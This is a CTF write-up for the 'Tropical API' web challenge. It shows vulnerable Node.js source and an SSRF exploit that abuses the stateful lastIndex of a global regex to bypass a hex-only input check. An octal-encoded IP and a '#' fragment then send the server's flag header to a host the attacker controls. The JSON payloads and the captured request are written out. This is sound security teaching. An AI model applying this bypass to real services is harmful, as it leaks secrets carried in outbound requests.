---
description: JavaScript Regex Shenanigans
---

# Tropical API

## Challenge

{% hint style="info" %}
Web, 23 Solves
{% endhint %}

> This internal API was accidentally exposed to the public. Fortunately, the developer left a backup of the backend source code for us.
>
> User input appears to be properly validated. Can you find a way to get the flag?

```javascript
import express from 'express';
import fetch from 'node-fetch';

if (!process.env.FLAG) {
    throw new Error('FLAG must be set');
}

const server = express();

server.use(express.static('public'));

server.post("/ping", express.json(), async function (req, res) {
    const errors = [];
    const noneHexRegex = /[^0-9a-f]/g;
    const fqdns = Array.isArray(req.body.fqdn) ? req.body.fqdn : [req.body.fqdn];

    if (fqdns.length >= 5) {
        return res.status(400).json({ error: 'Too many FQDNs' });
    }

    for (let fqdn of fqdns) {
        if (typeof fqdn !== "string") {
            errors.push(`${fqdn} must be a string`);
            continue;
        }

        if (noneHexRegex.test(fqdn)) {
            errors.push(`${fqdn} should only contain hexadecimal characters`);
            continue;
        }

        let buf = Buffer.from(fqdn, "hex");

        if (buf.length !== 16) {
            errors.push(`${fqdn} must be 16 bytes long`);
            continue;
        }

        const url = `http://${fqdn}.ping-proxy/ping`;

        try {
            await fetch(url, {
                headers: {
                    'X-FLAG': process.env.FLAG
                }
            });
        } catch (err) {
            errors.push(err.message);
        }
    }

    if (errors.length > 0) {
        res.status(500);
    }

    res.json({ errors });
});

server.listen(1337, function (err) {
    if (err) {
        throw err;
    }
    console.log('Server is up and running on http://localhost:1337');
});

```

## Solution

The premise of this challenge was simple - we had "SSRF-as-a-service", and the flag is in one of the request headers. We need to control `fqdn` to make a request to an arbitrary URL, where we are listening for a request.

The problem is that there is a very restrictive regex check that only allows us to use hexadecimal characters in the `fqdn`.

```javascript
const noneHexRegex = /[^0-9a-f]/g;

...

if (noneHexRegex.test(fqdn)) {
    errors.push(`${fqdn} should only contain hexadecimal characters`);
    continue;
}
```

If we look at the [documantation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\_Objects/RegExp/test) for `RegExp.prototype.test()`, however, we would notice a very interesting behaviour when `test()` is used with a regex containing the [global flag](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular\_Expressions#advanced\_searching\_with\_flags\_2).

![](<../../.gitbook/assets/Screenshot 2022-07-05 at 4.13.30 PM.png>)

This means that if the regex is being tested _multiple_ times for bad characters, each time the string is only searched from the previously-found index onwards.

This, combined with the fact that we are allowed to provide multiple `fqdn`s, means that we can bypass the restrictions by simply submitting the same payload multiple times. For instance, if we use the following:

```json
{
    "fqdn":[
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaax",
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaax"
    ]
}
```

The first time the regex is tested, `lastIndex` is set to 32 since the disallowed character, `x`, was found at the end of the string. The second time the regex is tested, no match would be found and `test()` would return `false`.

Great! We can bypass the regex restriction. The next problem is that when converted into a `Buffer` from hex, the length of the `Buffer` must be 16. This means we need a minimum of 32 characters in our `fqdn`.

```javascript
let buf = Buffer.from(fqdn, "hex");

if (buf.length !== 16) {
    errors.push(`${fqdn} must be 16 bytes long`);
    continue;
}
```

Luckily, the `Buffer` stops when the first non-hexadecimal character is encountered, so it's fine to have non-hexadecimal characters after the first 32 bytes.

But how do we provide a URL that starts with 32 bytes of hexadecimal characters? My teammate Enyei found this very helpful [article](https://www.hacksparrow.com/networking/many-faces-of-ip-address.html) that describes the various ways that IP addresses can be represented.

In this case, the octal notation proved very helpful. We could lead with as many `0`s as we want, which is a hexadecimal character. Then, we can use any [octal IP address converter](https://www.browserling.com/tools/ip-to-oct) to convert our public IP address to octal form. For example:

```json
{
    "fqdn":[
        "000000000000000000000002730000424#",
        "000000000000000000000002730000424#"
    ]
}
```

The ending `#` will turn the trailing `.ping-proxy/ping` into a URL fragment, making the final URL simply that of our public IP address.

This allows us to receive the request and get our flag.

```http
GET / HTTP/1.1
accept: */*
accept-encoding: gzip, deflate, br
connection: close
user-agent: node-fetch
x-flag: BSidesTLV2022{JavAsCriPtMaStEr}
Host: REDACTED
```
